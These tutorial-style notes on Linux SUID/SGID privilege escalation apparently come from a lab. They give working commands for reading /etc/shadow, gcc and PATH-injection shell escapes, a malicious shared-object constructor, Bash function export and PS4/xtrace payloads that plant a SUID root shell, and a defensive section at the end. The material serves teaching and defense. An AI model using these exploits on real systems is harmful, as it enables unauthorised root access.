# Linux Privilege Escalation: SUID/SGID Misconfiguration - Detailed Notes

## 1. Core Concepts: SUID, SGID, and Execution Mechanics

In Linux systems, file permissions control who can read, write, or execute files. However, standard permissions are sometimes too restrictive for necessary system tasks. This is where **Special Permissions (SUID and SGID)** come into play.

### Set User ID (SUID)

**The Mechanism:** When an executable file with the SUID bit set is executed, the operating system runs it with the privileges of the file's owner, rather than the user who executed it.

**Symbolic Representation:** An `s` replaces the execute (`x`) permission in the user triplet (e.g., `-rwsr-xr-x`).

#### Security Context (UID vs. eUID)

- **UID (Real User ID):** Identifies who actually executed the process (e.g., user `"aman"` with UID `1000`).
- **eUID (Effective User ID):** Identifies the security context the process uses to access system resources. When executing an SUID binary owned by `root`, your UID remains `1000`, but your eUID becomes `0` (`root`).

**Example:** If `root` owns `/usr/bin/passwd` with SUID set, any user can change their password because the `passwd` program temporarily gains root privileges during execution.

### Set Group ID (SGID)

**The Mechanism:** Similar to SUID, but the process executes with the privileges of the file's group owner.

**Symbolic Representation:** An `s` replaces the execute (`x`) permission in the group triplet (e.g., `-rwxr-sr-x`).

**Use Case:** Allows multiple users in a group to access shared resources with appropriate group permissions.

---

## 2. Discovery and Reconnaissance (Finding the Vulnerabilities)

Before exploiting an SUID/SGID vulnerability, you must identify binaries containing these special bits.

### The Enumeration Command

```bash
find / -type f -perm -4000 2>/dev/null
```

#### Command Breakdown

- `/` : Search recursively starting from the root directory.
- `-type f` : Limit search to files only (excluding directories or symlinks).
- `-perm -4000` : Find files with the SUID bit (octal `4`) set.
  - Alternative: `-perm -u=s` (same result, more readable).
  - For SGID: Use `-perm -2000` or `-perm -g=s`.
- `2>/dev/null` : Redirect error messages (like `"Permission Denied"`) to suppress noise.

### To find SGID files:

```bash
find / -type f -perm -2000 2>/dev/null
```

### Triage: Distinguishing Safe Binaries from Exploitable Targets

A standard Linux system has many default SUID binaries that are secure by design. You must learn to separate the noise from high-value targets.

#### Common Default/Safe Binaries

- `/bin/ping`
- `/usr/bin/passwd`
- `/usr/bin/sudo`
- `/usr/bin/chsh`
- `/usr/bin/gpasswd`

These are hardened and rarely offer exploitation vectors unless an unpatched zero-day exists.

#### High-Value / Custom Binaries to Target

- Unexpected administrative utilities with SUID: `cat`, `gcc`, `nano`, `vim`
- Completely custom-compiled applications located in non-standard paths:
  - `/opt/`
  - `/home/`
  - `/usr/local/bin/`
- Any binary you don't immediately recognize.

## 3. The 4 Exploitation Methodologies

Once an interesting SUID binary is discovered, your exploitation path depends on how that binary behaves. These techniques range from easy to advanced.

---

## Technique 1: Misusing Intended Functionality (Easy)

This occurs when standard system utilities that read or write files are accidentally given SUID root permissions. You don't execute code; you simply use the tool exactly as it was designed, but with administrative reach.

### Target Example: `/bin/cat` with SUID set

### Exploitation Workflow:

Since `cat` now executes as root, it can bypass standard file security restrictions. An attacker can directly read sensitive configuration data or credentials.

```bash
# Reading the shadow file to grab root's password hash
cat /etc/shadow
```

### Output Example:
```
root:$6$nWlR5y:17835:0:99999:7:::
user:$6$Qz7xK:17850:0:99999:7:::
```

### Outcome:
The attacker copies the root user's password hash and cracks it offline using brute-force tools like John the Ripper or Hashcat.

---

## Technique 2: Shell Escaping via GTFOBins (Easy)

Many legitimate binaries feature options that allow users to execute terminal commands or escape into interactive sub-shells (e.g., for pagination, text editing, or compilation).

### Target Example: `gcc` (GNU Compiler Collection) with SUID set

### Resource: GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited to bypass local security restrictions. If a binary is on your target system with SUID, check GTFOBins first.

---

### Exploitation Workflow:

According to GTFOBins, `gcc` has a `-wrapper` flag that can trigger alternative system commands:

```bash
gcc -wrapper /bin/sh,-s .
```

### How It Works:

- `gcc` starts normally with SUID root privileges  
- `-wrapper` tells gcc to wrap the compilation process  
- It executes `/bin/sh -s` before compilation  
- Since it runs as root, the spawned shell inherits root privileges  

### Outcome:
You land in a root shell. Verification:

```bash
id
```

Expected:
```
uid=0(root) gid=0(root)
```

### Other GTFOBins Examples:

- `vim`, `nano` → shell escape
- `less`, `man` → pager escape
- `find` → `-exec` abuse
- `awk`, `sed` → command execution features

---

## Technique 3: Path Variable Injection (Medium Difficulty)

This exploits custom scripts that call system binaries without absolute paths (e.g., `service` instead of `/usr/sbin/service`).

---

### Vulnerability Workflow:

A SUID application runs:

```c
system("service apache2 start");
```

The shell searches `$PATH` for `service`, allowing attackers to inject a malicious version.

---

### Discovery Steps:

```bash
# Find custom SUID binaries
find /usr/local/bin -type f -perm -4000 2>/dev/null

# Extract readable strings
strings /usr/local/bin/suid-env
```

Possible output:
```
service apache2 start
```

Compare secure version:
```
/usr/sbin/service apache2 start
```

---

### Exploitation Steps:

```bash
cd /tmp

nano service
```

### Malicious Payload:

```bash
#!/bin/sh
/bin/sh -p
```

```bash
chmod +x service
export PATH=/tmp:$PATH
```

---

### Execution:

```bash
/usr/local/bin/suid-env
```

---

### Attack Flow:

- `suid-env` runs as root (eUID=0)
- It calls `service apache2 start`
- System finds `/tmp/service` first via `$PATH`
- Malicious script executes as root
- Root shell is spawned

---

### Outcome:

```bash
whoami
root
```

---

### Key Defense Principle:
Always use absolute paths in scripts and avoid relying on `$PATH` for critical system operations.

---

## Technique 4: Shared Object (.so) Hijacking (Advanced)

This occurs when a binary dynamically loads external libraries from unsafe or writable locations.

---

### Reconnaissance Tools:

```bash
strings /usr/local/bin/suid-so

strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

---

### Vulnerability Example:

```
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT
```

Writable directory → attack surface.

---

## Exploitation Steps:

### Step 1: Create directory

```bash
mkdir -p /home/user/.config
```

---

### Step 2: Create malicious shared library

```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    system("/bin/sh -p");
}
```

---

### Why `constructor`?

This function executes automatically when the library is loaded, before `main()` runs, giving instant control.

---

### Step 3: Compile payload

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

---

### Compilation Flags:

- `-shared` → creates `.so` library  
- `-fPIC` → position-independent code  

---

### Step 4: Execute vulnerable binary

```bash
/usr/local/bin/suid-so
```

---

### Attack Flow:

- Binary runs as root
- Looks for `libcalc.so`
- Loads attacker-controlled library
- `constructor` executes immediately
- Root shell spawned

---

### Outcome:

```bash
whoami
root
```

---

### Real-World Behavior:

Before:
```bash
/usr/local/bin/suid-so
# normal execution
```

After exploitation:
```bash
/usr/local/bin/suid-so
sh-4.1# whoami
root
```
## 4. Advanced Exploitation: Abusing Shell Features

---

## Technique 4A: Bash Function Path Hijacking (Bash v4.2-048 and Earlier)

This sophisticated attack exploits a vulnerability in older Bash versions where you can create functions with names that look like absolute file paths, then export them to hijack system calls.

---

### The Vulnerability

Older Bash versions allowed functions whose names contain slashes (`/`). When exported, Bash checks memory for these functions before searching the filesystem.

---

## Discovery & Verification

```bash
# Check if the binary uses absolute paths
strings /usr/local/bin/suid-env2
```

Example output:
```
/usr/sbin/service apache2 start
```

```bash
# Check Bash version
/bin/bash --version
```

Vulnerable condition:
```
Bash v4.2-048 or earlier
```

---

## Exploitation Steps

```bash
# Step 1: Create a function with a path-like name
function /usr/sbin/service { /bin/bash -p; }

# Step 2: Export function to environment
export -f /usr/sbin/service

# Step 3: Run vulnerable SUID binary
/usr/local/bin/suid-env2
```

---

## How the Attack Works

- Function `/usr/sbin/service` is stored in Bash memory
- `export -f` exposes it to child processes
- `suid-env2` runs as root and calls `/usr/sbin/service`
- Bash resolves function first (memory lookup)
- System binary is never executed
- Malicious function runs with root privileges

---

## Outcome

```bash
whoami
root
```

---

## Why Modern Systems Are Safe

Bash ≥ v4.2-049 prevents exporting function names containing `/`, closing this attack vector.

---

# Technique 4B: Bash Debugging Mode Exploitation (PS4 Variable Hijacking)

This technique abuses Bash debug tracing (`xtrace`) and the `PS4` prompt variable to execute hidden commands as root.

---

## Core Concept

When Bash runs in debug mode:

- Every command is printed before execution
- Prefix is controlled by `PS4`
- If `PS4` contains command substitution (`$(...)`), it executes

Inside a SUID root context, this becomes a privilege escalation path.

---

## Exploitation Steps

```bash
env -i SHELLOPTS=xtrace \
PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' \
/usr/local/bin/suid-env2
```

---

## Command Breakdown

- `env -i` → clean environment (removes interference)
- `SHELLOPTS=xtrace` → enables Bash debug mode
- `PS4=...` → sets debug prefix payload
  - `cp /bin/bash /tmp/rootbash` → copies shell
  - `chmod +xs` → sets SUID + execute permissions
- `/usr/local/bin/suid-env2` → vulnerable SUID binary

---

## How the Attack Works

- `suid-env2` runs with root privileges (eUID=0)
- Debug mode (`xtrace`) is triggered
- Bash prints execution trace
- `PS4` is evaluated for each trace line
- Command substitution `$(...)` executes immediately
- Payload runs as root:
  - `/bin/bash` copied to `/tmp/rootbash`
  - SUID bit applied to new binary

---

## Accessing Root

```bash
/tmp/rootbash -p
```

Verify:

```bash
whoami
```

Expected:
```
root
```

---

## Why the `-p` Flag Matters

Modern shells drop elevated privileges by default.  
`-p` forces preservation of effective root privileges.

---

## Cleanup (Important)

```bash
rm /tmp/rootbash
exit
```

---

### Why cleanup is necessary

- `/tmp` is shared between users
- Leaving SUID binaries creates persistence risks
- Other users could reuse the backdoor

---
## 5. Key Differences: `/bin/bash` vs. `/bin/sh`

When writing exploits or system commands, you’ll encounter both `/bin/bash` and `/bin/sh`. Understanding their differences is crucial for crafting reliable attacks.

---

## Core Differences

| Feature | `/bin/sh` | `/bin/bash` |
|--------|----------|-------------|
| Origin | POSIX standard shell (Stephen Bourne, 1970s) | Bash = "Bourne Again Shell" (GNU project) |
| Purpose | Minimal, fast, standard compliance | Advanced features, interactive use |
| Interactive Use | Very basic (no colors, no autocomplete) | Feature-rich (tab completion, history, colors) |
| Speed & Size | Lightweight and very fast | Heavier due to advanced features |
| Scripting Capabilities | Basic shell syntax | Advanced (arrays, regex, loops, string manipulation) |
| Prompt | Simple `#` or `$` | Customizable (e.g., themed prompts) |

---

## Modern Linux Reality

On modern Linux systems, `/bin/sh` is often a symlink to another shell:

```bash
# Check what /bin/sh actually points to
ls -l /bin/sh
```

Example output:
```
/bin/sh -> /bin/dash
```

### Common Defaults:

- **Debian/Ubuntu:** `/bin/sh → /bin/dash` (lightweight POSIX shell)
- **RedHat/CentOS:** `/bin/sh → /bin/bash` (POSIX mode)

---

## When to Use Which

### Use `/bin/sh` when:

- Maximum portability is needed
- Script must run on any Unix-like system
- Writing system/boot scripts
- You want minimal dependencies

---

### Use `/bin/bash` when:

- You need advanced features (arrays, regex, arithmetic expansion)
- You are working on modern Linux systems
- You need better debugging tools
- You are writing complex automation scripts

---

## In Exploitation Context

- `/bin/sh` → more portable, less predictable environment
- `/bin/bash` → more powerful, more exploit features available

### Important rule in privilege escalation:

```bash
/bin/bash -p
```

- `-p` preserves elevated privileges
- Prevents Bash from dropping effective root UID

---

# 6. Lab Exercise: Complete Workflow (suid-so Example)

This is a full shared-object injection attack workflow.

---

## Initial Reconnaissance

```bash
# Find SUID binaries
find /usr/local/bin -type f -perm -4000
```

---

```bash
# Run binary to observe behavior
/usr/local/bin/suid-so
```

Output:
```
[========================================] 100%
```

---

```bash
# Trace missing library calls
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Example output:
```
open("/home/user/.config/libcalc.so") = -1 ENOENT
```

---

## Exploitation

```bash
# Step 1: Create required directory
mkdir -p /home/user/.config
```

---

```bash
# Step 2: Create malicious payload
cat > /tmp/libcalc.c << 'EOF'
#include <stdlib.h>

void __attribute__((constructor)) init() {
    system("/bin/sh -p");
}
EOF
```

---

```bash
# Step 3: Compile shared object
gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
```

---

```bash
# Step 4: Execute vulnerable binary
/usr/local/bin/suid-so
```

---

## Result

```bash
whoami
```

Expected:
```
root
```

---
## 7. Defensive Measures: Protecting Against SUID Exploitation

---

## For System Administrators and Developers:

---

## Enforce Absolute Paths

```bash
# ❌ Bad practice
system("service apache2 start");
```

```bash
# ✅ Good practice
system("/usr/sbin/service apache2 start");
```

Using absolute paths ensures the system does not rely on environment variables like `$PATH`, which can be manipulated by attackers.

---

## Apply the Principle of Least Privilege

- Never set SUID on development tools:
  - `gcc`
  - `vim`
  - `nano`

- Never set SUID on interpreters:
  - `perl`
  - `python`
  - `bash`

- Only assign SUID when absolutely required for system functionality

---

## Secure Library Loading

```bash
# Avoid unsafe library search paths
# Do NOT rely on user-writable directories

# Be extremely cautious with:
LD_LIBRARY_PATH
```

### Best practices:

- Avoid `LD_LIBRARY_PATH` in production binaries
- Prefer static linking where possible
- Restrict writable directories in library search paths

---

## Regular Audits

```bash
# Create baseline of SUID binaries
find / -type f -perm -4000 2>/dev/null > /tmp/suid_baseline.txt
```

Compare periodically against trusted lists to detect:
- New or unknown SUID binaries
- Unexpected privilege escalations
- Misconfigurations introduced over time

---

## Keep Systems Updated

- Regularly patch Bash (especially older versions)
- Update system binaries and libraries
- Monitor security advisories (CVEs) related to privilege escalation
- Apply kernel and package updates promptly

---

## Summary: Exploitation Difficulty Ladder

- **Easy (Technique 1):** Misusing intended functionality  
  → Direct use of SUID-enabled utilities  

- **Easy (Technique 2):** GTFOBins shell escape  
  → Known escape features in binaries  

- **Medium (Technique 3):** PATH injection  
  → Environment variable manipulation  

- **Hard (Technique 4):** Shared object hijacking  
  → Requires C payloads + compilation  

- **Very Hard (Techniques 4A/4B):** Advanced shell abuse  
  → Bash internals, function export tricks, debug exploitation  

---
```
